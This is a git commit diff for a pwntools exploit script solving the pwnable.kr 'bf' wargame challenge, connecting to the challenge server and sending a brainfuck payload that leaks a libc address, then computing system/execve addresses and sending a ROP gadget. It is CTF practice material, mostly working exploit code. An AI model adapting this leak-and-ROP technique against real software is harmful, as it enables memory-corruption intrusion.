dd13cbb15a2e914777026c17f451fea862ee9994
Noy Pearl <11259340+noypearl@users.noreply.github.com>
2024-06-21 14:28:34 +0300

    fixed connection 1 byte issue!

--- brainfk/solve.py
+++ brainfk/solve.py
@@ -6,10 +6,10 @@ context.update(arch="i386", os="linux")
 log.info("Start pwning...")
 
 #ELF_NAME = "./ctf-bf"
-ELF_NAME = "./bf"
+#ELF_NAME = "./bf"
 # Load executable
 #exe = ELF("./bf")
-exe = ELF(ELF_NAME)
+#exe = ELF(ELF_NAME)
 
 # Libc
 libc = ELF("./libc.so.6")
@@ -25,14 +25,12 @@ puts_addr = p32(next(libc.search(b"puts")))
 
 #print(f"DUMP: {my_rop.dump()}")
 # Start process
+#conn = process("./bf")
 #conn = process("./ctf-bf")
 conn = remote("pwnable.kr",9001)
+print(conn.recvline()) # main massage
+print(conn.recvline()) # main massage
 #conn = process(ELF_NAME)
-#conn = gdb.debug("./bf",
-#env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
-#br *0x8048717
-#'''
-#)
 
 with open("payload", "w") as f:
     f.write("")
@@ -44,51 +42,35 @@ print(f"system_addr: {str(system_addr)}")
 print(f"execve: {p32(execve_addr)}")
 padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
 # fill stack with arbitrary values so I can increase esp and prepare stack for
-#payload = padding +sh_addr + system_addr
 sh_addr = system_addr + 0x120d7b
 
-exit_addr = libc.symbols["exit"]
-return_addr = 0x08048830 # return from program - we call it since if we call
 return_addr = libc_base + 0x00003980 # return from program - we call it since if we call
 #exit() then our execve() fork process will die
 arbitrary_bash_addr = 0xffffcc0c
 new_esp_val = 0x12345678
-payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
+#payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
 print(f"sh_addr: {str(sh_addr)}")
-payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload = b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b".>.>.>." # leak the address of libc
 payload += b"<<<" # leak the address of libc
-#payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # putchar - for sending the last char
 payload += b"[" # call to puts()
-payload +=b"\n"
+payload += b"\n" # call to puts()
 conn.send(payload)
-#payload += "." # call to putchar()
+
+the_output = conn.recvn(4)
+print(f"OUTPUT: {the_output}")
+
 # 2nd part - the input to write ( the function to jump to ) 
 with open("payload", "wb+") as f:
     f.write(payload)
 # separate sends cuz of annoying encoding / decoding issue with p32() and
-# strings
-target = libc_base + 0x001134d9 # add to esp
-my_rop = p32(target)
-print(f"ROP: {my_rop}")
-payload = my_rop
-payload +=b"BBBB"
-payload +=b"\n"
-conn.send(payload)
-with open("payload", "ab+") as f:
-    f.write(payload)
-
-print(payload)
-
-print(conn.recvline()) # main massage
-print(conn.recvline()) # main massage 2
-output = conn.recv()
+#pasted
+#print(f"LOL: {conn.recvline()}")
 with open("output", "wb") as a:
-    a.write(output)
+    a.write(the_output)
 
-print(f"OUTPUT: {output}")
-puts_addr = unpack(output, endian='little')
+puts_addr = unpack(the_output, endian='little')
 print(f"puts addr: {puts_addr}") # receive until newline
 print(f"puts addr: {hex(puts_addr)}") # receive until newline
 puts_distance_from_libc = 392368
@@ -101,7 +83,16 @@ system_addr = libc.symbols["system"]
 execve_addr = libc.symbols["execve"]
 print(f"system_addr: {str(system_addr)}")
 print(f"execve: {str(execve_addr)}")
+#pasted
 
+target = libc_base + 0x001134d9 # add to esp
+my_rop = p32(target)
+print(f"ROP: {my_rop}")
+payload = my_rop
+payload +=b"BBBB"
+conn.sendline(payload)
+with open("payload", "ab+") as f:
+    f.write(payload)
 
-
+print(payload)
 
